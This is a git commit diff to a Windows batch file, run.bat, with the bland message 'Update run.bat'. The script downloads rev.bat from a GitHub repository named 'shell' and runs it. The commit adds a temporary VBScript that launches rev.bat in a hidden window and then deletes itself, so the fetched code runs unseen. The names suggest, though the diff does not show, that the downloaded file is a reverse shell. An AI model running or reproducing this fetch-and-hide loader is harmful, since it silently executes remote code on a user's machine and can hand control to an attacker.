e60a5be25167dd7060d3e46ff6d6fd6b5b80d35b
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 04:42:22 +0300

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,3 +1,7 @@
 @echo off
+set "VBScript=%temp%\hidden.vbs"
+echo Set WshShell = CreateObject("WScript.Shell") > "%VBScript%"
+echo WshShell.Run "cmd /c rev.bat", 0, False >> "%VBScript%"
 curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o rev.bat
-start /min cmd /c rev.bat
+start /min wscript.exe "%VBScript%"
+del "%VBScript%"
